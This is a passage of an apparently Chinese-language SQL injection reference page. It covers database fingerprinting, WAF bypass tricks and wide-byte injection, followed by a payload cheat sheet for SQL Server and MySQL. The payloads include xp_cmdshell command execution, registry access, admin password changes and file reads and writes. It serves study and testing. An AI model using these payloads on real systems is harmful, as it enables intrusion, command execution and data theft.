&lt;ul&gt;
&lt;li&gt;网络请求&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;权限提升&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#权限提升&#34;&gt;#&lt;/a&gt; 权限提升&lt;/h1&gt;
&lt;h2 id=&#34;udf提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#udf提权&#34;&gt;#&lt;/a&gt; UDF 提权&lt;/h2&gt;
&lt;p&gt;UDF（User Defined Function，用户自定义函数）是 MySQL 提供的一个功能，可以通过编写 DLL 扩展为 MySQL 添加新函数，扩充其功能。&lt;/p&gt;
&lt;p&gt;当获得 MySQL 权限之后，即可通过这种方式上传自定义的扩展文件，从 MySQL 中执行系统命令。&lt;/p&gt;
&lt;h1 id=&#34;数据库检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库检测&#34;&gt;#&lt;/a&gt; 数据库检测&lt;/h1&gt;
&lt;h2 id=&#34;mysql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mysql&#34;&gt;#&lt;/a&gt; MySQL&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;sleep  &lt;code&gt;sleep(1)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;benchmark  &lt;code&gt;BENCHMARK(5000000, MD5(&#39;test&#39;))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;字符串连接
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT &#39;a&#39; &#39;b&#39;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT CONCAT(&#39;some&#39;,&#39;string&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;version
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT @@version&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT version()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;识别用函数
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;connection_id()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;last_insert_id()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;row_count()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;oracle&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#oracle&#34;&gt;#&lt;/a&gt; Oracle&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;字符串连接
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&#39;a&#39;||&#39;oracle&#39; --&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT CONCAT(&#39;some&#39;,&#39;string&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;version
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT banner FROM v$version&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT banner FROM v$version WHERE rownum=1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;sqlserver&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sqlserver&#34;&gt;#&lt;/a&gt; SQLServer&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;WAITFOR  &lt;code&gt;WAITFOR DELAY &#39;00:00:10&#39;;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;SERVERNAME  &lt;code&gt;SELECT @@SERVERNAME&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;version  &lt;code&gt;SELECT @@version&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;字符串连接
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT &#39;some&#39;+&#39;string&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;常量
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;@@pack_received&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@@rowcount&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;postgresql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#postgresql&#34;&gt;#&lt;/a&gt; PostgreSQL&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;sleep  &lt;code&gt;pg_sleep(1)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;绕过技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过技巧&#34;&gt;#&lt;/a&gt; 绕过技巧&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;编码绕过&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;大小写&lt;/li&gt;
&lt;li&gt;url 编码&lt;/li&gt;
&lt;li&gt;html 编码&lt;/li&gt;
&lt;li&gt;十六进制编码&lt;/li&gt;
&lt;li&gt;unicode 编码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;注释&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;//&lt;/code&gt;   &lt;code&gt;--&lt;/code&gt;   &lt;code&gt;-- +&lt;/code&gt;   &lt;code&gt;-- -&lt;/code&gt;   &lt;code&gt;#&lt;/code&gt;   &lt;code&gt;/**/&lt;/code&gt;   &lt;code&gt;;%00&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;内联注释用的更多，它有一个特性  &lt;code&gt;/!**/&lt;/code&gt;  只有 MySQL 能识别&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;index.php?id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;只过滤了一次时&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;union&lt;/code&gt;  =&amp;gt;  &lt;code&gt;ununionion&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;相同功能替换&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;函数替换
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;substring&lt;/code&gt;  /  &lt;code&gt;mid&lt;/code&gt;  /  &lt;code&gt;sub&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ascii&lt;/code&gt;  /  &lt;code&gt;hex&lt;/code&gt;  /  &lt;code&gt;bin&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;benchmark&lt;/code&gt;  /  &lt;code&gt;sleep&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;变量替换
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;user()&lt;/code&gt;  /  &lt;code&gt;@@user&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;符号和关键字
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;and&lt;/code&gt;  / `&amp;amp;``&lt;/li&gt;
&lt;li&gt;&lt;code&gt;or&lt;/code&gt;  /  &lt;code&gt;|&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;HTTP 参数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;HTTP 参数污染
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;id=1&amp;amp;id=2&amp;amp;id=3&lt;/code&gt;  根据容器不同会有不同的结果&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;HTTP 分割注入&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;缓冲区溢出&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一些 C 语言的 WAF 处理的字符串长度有限，超出某个长度后的 payload 可能不会被处理&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;二次注入有长度限制时，通过多句执行的方法改掉数据库该字段的长度绕过&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;sql注入小技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql注入小技巧&#34;&gt;#&lt;/a&gt; SQL 注入小技巧&lt;/h1&gt;
&lt;h2 id=&#34;宽字节注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#宽字节注入&#34;&gt;#&lt;/a&gt; 宽字节注入&lt;/h2&gt;
&lt;p&gt;一般程序员用 gbk 编码做开发的时候，会用  &lt;code&gt;set names &#39;gbk&#39;&lt;/code&gt;  来设定，这句话等同于&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;set
character_set_connection = &#39;gbk&#39;,
character_set_result = &#39;gbk&#39;,
character_set_client = &#39;gbk&#39;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;漏洞发生的原因是执行了  &lt;code&gt;set character_set_client = &#39;gbk&#39;;&lt;/code&gt;  之后，mysql 就会认为客户端传过来的数据是 gbk 编码的，从而使用 gbk 去解码，而 mysql_real_escape 是在解码前执行的。但是直接用  &lt;code&gt;set names &#39;gbk&#39;&lt;/code&gt;  的话 real_escape 是不知道设置的数据的编码的，就会加  &lt;code&gt;%5c&lt;/code&gt;  。此时 server 拿到数据解码 就认为提交的字符 +%5c 是 gbk 的一个字符，这样就产生漏洞了。&lt;/p&gt;
&lt;p&gt;解决的办法有三种，第一种是把 client 的 charset 设置为 binary，就不会做一次解码的操作。第二种是是  &lt;code&gt;mysql_set_charset(&#39;gbk&#39;)&lt;/code&gt;  ，这里就会把编码的信息保存在和数据库的连接里面，就不会出现这个问题了。 第三种就是用 pdo。&lt;/p&gt;
&lt;p&gt;还有一些其他的编码技巧，比如 latin 会弃掉无效的 unicode，那么 admin%32 在代码里面不等于 admin，在数据库比较会等于 admin。&lt;/p&gt;
&lt;h1 id=&#34;cheatsheet&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cheatsheet&#34;&gt;#&lt;/a&gt; CheatSheet&lt;/h1&gt;
&lt;h2 id=&#34;sql-server-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-server-payload&#34;&gt;#&lt;/a&gt; SQL Server Payload&lt;/h2&gt;
&lt;h3 id=&#34;常见payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见payload&#34;&gt;#&lt;/a&gt; 常见 Payload&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Version&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT @@version&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT SERVERPROPERTY(&#39;Edition&#39;);&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT SERVERPROPERTY(&#39;EngineEdition&#39;);&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Comment&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT 1 -- comment&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT /*comment*/1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Space&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0x01 - 0x20&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用户信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT user_name()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;``SELECT system_user`&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT user&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用户权限&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;select IS_SRVROLEMEMBER(&#39;sysadmin&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;select IS_SRVROLEMEMBER(&#39;db_owner&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;List User&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SELECT name FROM master..syslogins&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数据库信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT name FROM master..sysdatabases&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;select concat_ws(table_schema,table_name,column_name) from information_schema.columns&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;select quotename(name) from master..sysdatabases FOR XML PATH(&#39;&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;执行命令&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;EXEC xp_cmdshell &#39;net user&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Ascii&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT char(0x41)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT ascii(&#39;A&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT char(65)+char(66)&lt;/code&gt;  =&amp;gt; return  &lt;code&gt;AB&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Delay&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;WAITFOR DELAY &#39;0:0:3&#39;&lt;/code&gt;  pause for 3 seconds&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Change Password&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ALTER LOGIN [sa] WITH PASSWORD=N&#39;NewPassword&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Trick&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;id=1 union:select password from:user&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;文件读取&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;OpenRowset&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;当前查询语句&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;hostname&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用于判断是否站库分离&lt;/li&gt;
&lt;li&gt;&lt;code&gt;select host_name()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;exec xp_getnetname&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;服务器信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;exec xp_msver&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;系统配置&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;select * from sys.configurations;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;注册表读写&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注册表读写&#34;&gt;#&lt;/a&gt; 注册表读写&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;xp_regread&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;exec xp_regread N&#39;HKEY_LOCAL_MACHINE&#39;, N&#39;SYSTEM\CurrentControlSet\Services\MSSEARCH&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;xp_regwrite&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;xp_regdeletvalue&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;xp_regdeletkey&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;xp_regaddmultistring&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;报错注入-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#报错注入-2&#34;&gt;#&lt;/a&gt; 报错注入&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;1=convert(int,(db_name()))&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;常用函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用函数&#34;&gt;#&lt;/a&gt; 常用函数&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;SUSER_NAME()&lt;/li&gt;
&lt;li&gt;USER_NAME()&lt;/li&gt;
&lt;li&gt;PERMISSIONS()&lt;/li&gt;
&lt;li&gt;DB_NAME()&lt;/li&gt;
&lt;li&gt;FILE_NAME()&lt;/li&gt;
&lt;li&gt;TYPE_NAME()&lt;/li&gt;
&lt;li&gt;COL_NAME()&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;dns-oob&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dns-oob&#34;&gt;#&lt;/a&gt; DNS OOB&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;fn_xe_file_target_read_file&lt;/li&gt;
&lt;li&gt;fn_get_audit_file&lt;/li&gt;
&lt;li&gt;fn_trace_gettable&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;其他常用存储过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他常用存储过程&#34;&gt;#&lt;/a&gt; 其他常用存储过程&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;sp_execute_external_script&lt;/li&gt;
&lt;li&gt;sp_makewebtask&lt;/li&gt;
&lt;li&gt;sp_OACreate&lt;/li&gt;
&lt;li&gt;sp_OADestroy&lt;/li&gt;
&lt;li&gt;sp_OAGetErrorInfo&lt;/li&gt;
&lt;li&gt;sp_OAGetProperty&lt;/li&gt;
&lt;li&gt;sp_OAMethod&lt;/li&gt;
&lt;li&gt;sp_OASetProperty&lt;/li&gt;
&lt;li&gt;sp_OAStop&lt;/li&gt;
&lt;li&gt;xp_cmdshell&lt;/li&gt;
&lt;li&gt;xp_dirtree&lt;/li&gt;
&lt;li&gt;xp_enumerrorlogs&lt;/li&gt;
&lt;li&gt;xp_enumgroups&lt;/li&gt;
&lt;li&gt;xp_fixeddrives&lt;/li&gt;
&lt;li&gt;xp_getfiledetails&lt;/li&gt;
&lt;li&gt;xp_loginconfig&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;mysql-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mysql-payload&#34;&gt;#&lt;/a&gt; MySQL Payload&lt;/h2&gt;
&lt;h3 id=&#34;常见payload-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见payload-2&#34;&gt;#&lt;/a&gt; 常见 Payload&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Version&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT @@version&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Comment&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT 1 -- comment&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT 1 # comment&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT /*comment*/1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Space&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0x9&lt;/code&gt;   &lt;code&gt;0xa-0xd&lt;/code&gt;   &lt;code&gt;0x20&lt;/code&gt;   &lt;code&gt;0xa0&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Current User&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT user()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT system_user()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT current_role()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;List User&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT user FROM mysql.user&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Current Database&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT database()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;List Database&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT schema_name FROM information_schema.schemata&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;List Tables&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != &#39;mysql&#39; AND table_schema != &#39;information_schema&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;List Columns&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != &#39;mysql&#39; AND table_schema != &#39;information_schema&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;If&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT if(1=1,&#39;foo&#39;,&#39;bar&#39;);&lt;/code&gt;  return &#39;foo&#39;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Ascii&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;`SELECT char(0x41)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT ascii(&#39;A&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT 0x414243&lt;/code&gt;  =&amp;gt; return  &lt;code&gt;ABC&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Delay&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sleep(1)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT BENCHMARK(1000000,MD5(&#39;A&#39;))&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Read File&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;select @@datadir``select load_file(&#39;databasename/tablename.MYD&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Blind&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ascii(substring(str,pos,length)) &amp;amp; 32 = 1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Error Based&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;select count(*) from (select 1 union select null union select !1)x group by concat((select table_name from information_schema.tables limit 1),floor(rand(0)*2))&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Change Password&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;mysql -uroot -e &amp;quot;use mysql;UPDATE user SET password=PASSWORD(&#39;newpassword&#39;) WHERE user=&#39;root&#39;;FLUSH PRIVILEGES;&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;报错注入常见函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#报错注入常见函数&#34;&gt;#&lt;/a&gt; 报错注入常见函数&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;extractvalue&lt;/li&gt;
&lt;li&gt;updatexml&lt;/li&gt;
&lt;li&gt;GeometryCollection&lt;/li&gt;
&lt;li&gt;linestring&lt;/li&gt;
&lt;li&gt;multilinestring&lt;/li&gt;
&lt;li&gt;multipoint&lt;/li&gt;
&lt;li&gt;multipolygon&lt;/li&gt;
&lt;li&gt;polygon&lt;/li&gt;
&lt;li&gt;exp&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;写文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#写文件&#34;&gt;#&lt;/a&gt; 写文件&lt;/h3&gt;
&lt;h4 id=&#34;写文件前提&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#写文件前提&#34;&gt;#&lt;/a&gt; 写文件前提&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;root 权限&lt;/li&gt;
&lt;li&gt;知晓文件绝对路径&lt;/li&gt;
&lt;li&gt;写入的路径存在写入权限&lt;/li&gt;
&lt;li&gt;secure_file_priv 允许向对应位置写入&lt;/li&gt;
&lt;li&gt;&lt;code&gt;select count(file_priv) from mysql.user&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;基于into写文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于into写文件&#34;&gt;#&lt;/a&gt; 基于 into 写文件&lt;/h4&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;into&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;outfile&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/tmp/demo.txt&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;into&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;dumpfile&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/tmp/demo.txt&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;dumpfile 和 outfile 不同在于，outfile 会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏&lt;/p&gt;
